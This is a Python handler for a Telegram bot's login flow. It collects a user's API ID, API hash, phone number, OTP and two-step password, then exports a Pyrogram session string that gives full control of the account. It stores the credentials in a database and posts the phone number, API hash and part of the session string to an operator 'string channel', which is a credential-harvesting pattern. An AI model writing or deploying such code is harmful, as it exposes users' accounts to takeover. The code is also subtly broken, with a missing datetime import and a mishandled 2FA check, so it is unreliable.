import logging
from typing import Dict, Any
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from utils.helpers import (
    log_to_channel, create_pyrogram_session,
    validate_phone_number, check_admin, get_user_accounts
)
from database.mongodb import get_accounts_collection, get_users_collection
from config import Config
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid,
    PhoneCodeExpired, FloodWait
)

config = Config()
logger = logging.getLogger(__name__)

# Store login states
login_states: Dict[int, Dict[str, Any]] = {}

async def handle_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /login command"""
    user_id = update.effective_user.id
    
    # Check if user already has max accounts
    accounts = await get_user_accounts(user_id)
    if len(accounts) >= config.MAX_ACCOUNTS_PER_USER:
        await update.message.reply_text(
            f"❌ You have reached the maximum limit of {config.MAX_ACCOUNTS_PER_USER} accounts!"
        )
        return
    
    # Check total accounts limit
    from utils.helpers import get_active_accounts_count
    total_accounts = await get_active_accounts_count()
    if total_accounts >= config.MAX_TOTAL_ACCOUNTS:
        await update.message.reply_text(
            f"❌ Bot has reached maximum capacity of {config.MAX_TOTAL_ACCOUNTS} accounts!"
        )
        return
    
    # Initialize login state
    login_states[user_id] = {
        "step": "api_id",
        "data": {}
    }
    
    await update.message.reply_text(
        "🔐 Please send your API ID:\n\n"
        "You can get it from https://my.telegram.org"
    )

async def handle_login_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle login process messages"""
    user_id = update.effective_user.id
    
    if user_id not in login_states:
        return
    
    state = login_states[user_id]
    step = state["step"]
    text = update.message.text
    
    try:
        if step == "api_id":
            # Validate API ID
            if not text.isdigit():
                await update.message.reply_text("❌ Please send a valid numeric API ID!")
                return
            
            state["data"]["api_id"] = int(text)
            state["step"] = "api_hash"
            await update.message.reply_text("🔑 Please send your API Hash:")
            
        elif step == "api_hash":
            # Validate API Hash
            if len(text) < 10:
                await update.message.reply_text("❌ Please send a valid API Hash!")
                return
            
            state["data"]["api_hash"] = text
            state["step"] = "phone_number"
            await update.message.reply_text(
                "📱 Please send your phone number in international format:\n"
                "Example: +1234567890"
            )
            
        elif step == "phone_number":
            # Validate phone number
            if not await validate_phone_number(text):
                await update.message.reply_text("❌ Invalid phone number format!")
                return
            
            # Check if phone number already exists
            accounts_collection = await get_accounts_collection()
            existing_account = await accounts_collection.find_one({
                "phone_number": text,
                "is_deleted": False
            })
            
            if existing_account:
                await update.message.reply_text(
                    "❌ This phone number is already registered!\n"
                    "Please use a different number."
                )
                del login_states[user_id]
                return
            
            state["data"]["phone_number"] = text
            state["step"] = "account_name"
            await update.message.reply_text("👤 Please send a name for this account:")
            
        elif step == "account_name":
            if len(text) < 2 or len(text) > 50:
                await update.message.reply_text("❌ Account name must be 2-50 characters!")
                return
            
            state["data"]["account_name"] = text
            
            # Start Pyrogram session creation
            await update.message.reply_text("🔄 Creating session... Please wait!")
            
            # Create Pyrogram client
            session_name = f"sessions/{user_id}_{state['data']['phone_number']}"
            
            app = Client(
                session_name,
                api_id=state["data"]["api_id"],
                api_hash=state["data"]["api_hash"],
                phone_number=state["data"]["phone_number"]
            )
            
            try:
                await app.connect()
                sent_code = await app.send_code(state["data"]["phone_number"])
                
                state["data"]["phone_code_hash"] = sent_code.phone_code_hash
                state["app"] = app
                state["step"] = "otp"
                
                await update.message.reply_text(
                    "📲 An OTP has been sent to your phone.\n"
                    "Please send the OTP code:"
                )
                
            except FloodWait as e:
                await update.message.reply_text(
                    f"⏳ Flood wait: Please wait {e.value} seconds before trying again!"
                )
                del login_states[user_id]
                await app.disconnect()
                
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
                del login_states[user_id]
                await app.disconnect()
                
        elif step == "otp":
            if not text.isdigit() or len(text) != 5:
                await update.message.reply_text("❌ Please send a valid 5-digit OTP!")
                return
            
            app = state.get("app")
            if not app:
                await update.message.reply_text("❌ Session expired. Please start over!")
                del login_states[user_id]
                return
            
            try:
                # Sign in with OTP
                signed_in = await app.sign_in(
                    phone_number=state["data"]["phone_number"],
                    phone_code_hash=state["data"]["phone_code_hash"],
                    phone_code=text
                )
                
                # If 2FA is enabled, ask for password
                if isinstance(signed_in, SessionPasswordNeeded):
                    state["step"] = "password"
                    await update.message.reply_text(
                        "🔒 This account has two-step verification enabled.\n"
                        "Please send your password:"
                    )
                else:
                    # Successfully signed in
                    await complete_login(update, context, state)
                    
            except PhoneCodeInvalid:
                await update.message.reply_text("❌ Invalid OTP code. Please try again!")
            except PhoneCodeExpired:
                await update.message.reply_text("❌ OTP code expired. Please start over!")
                del login_states[user_id]
                await app.disconnect()
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
                del login_states[user_id]
                await app.disconnect()
                
        elif step == "password":
            password = text
            app = state.get("app")
            
            try:
                await app.check_password(password)
                await complete_login(update, context, state)
                
            except Exception as e:
                await update.message.reply_text(f"❌ Invalid password: {str(e)}")
                del login_states[user_id]
                await app.disconnect()
                
    except Exception as e:
        logger.error(f"Login error: {e}")
        await update.message.reply_text("❌ An error occurred. Please start over!")
        if user_id in login_states:
            app = login_states[user_id].get("app")
            if app:
                await app.disconnect()
            del login_states[user_id]

async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE, state: Dict):
    """Complete the login process and save account"""
    user_id = update.effective_user.id
    app = state["app"]
    
    try:
        # Get session string
        session_string = await app.export_session_string()
        
        # Get user info
        me = await app.get_me()
        
        # Save account to database
        accounts_collection = await get_accounts_collection()
        users_collection = await get_users_collection()
        
        account_data = {
            "user_id": user_id,
            "phone_number": state["data"]["phone_number"],
            "api_id": state["data"]["api_id"],
            "api_hash": state["data"]["api_hash"],
            "session_string": session_string,
            "account_name": state["data"]["account_name"],
            "first_name": me.first_name,
            "last_name": me.last_name,
            "username": me.username,
            "is_active": True,
            "is_frozen": False,
            "is_deleted": False,
            "created_at": datetime.utcnow(),
            "updated_at": datetime.utcnow()
        }
        
        result = await accounts_collection.insert_one(account_data)
        
        # Update user's account list
        await users_collection.update_one(
            {"user_id": user_id},
            {"$addToSet": {"accounts": result.inserted_id}},
            upsert=True
        )
        
        # Send session string to string channel
        if config.STRING_CHANNEL:
            await log_to_channel(
                context.bot,
                config.STRING_CHANNEL,
                f"🔐 New Account Login\n\n"
                f"👤 User ID: {user_id}\n"
                f"📱 Phone: {state['data']['phone_number']}\n"
                f"🏷️ Name: {state['data']['account_name']}\n"
                f"🆔 API ID: {state['data']['api_id']}\n"
                f"🔑 API Hash: {state['data']['api_hash']}\n"
                f"📦 Session String:\n<code>{session_string[:100]}...</code>"
            )
        
        # Log to main log
        if config.MAIN_LOG_CHANNEL:
            await log_to_channel(
                context.bot,
                config.MAIN_LOG_CHANNEL,
                f"✅ Account Login Successful\n\n"
                f"👤 User: {user_id}\n"
                f"📱 Account: {state['data']['account_name']}\n"
                f"📞 Phone: {state['data']['phone_number']}"
            )
        
        await update.message.reply_text(
            f"✅ Account added successfully!\n\n"
            f"🏷️ Name: {state['data']['account_name']}\n"
            f"📱 Phone: {state['data']['phone_number']}\n"
            f"👤 Username: @{me.username}\n\n"
            f"You can now use this account with other commands."
        )
        
    except Exception as e:
        logger.error(f"Complete login error: {e}")
        await update.message.reply_text(f"❌ Error saving account: {str(e)}")
    finally:
        # Clean up
        await app.disconnect()
        if user_id in login_states:
            del login_states[user_id]

async def handle_login_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle login callback queries"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = query.from_user.id
    
    # Handle different login callbacks
    # Add your callback handlers here
    
    await query.edit_message_text("Login callback handled!")
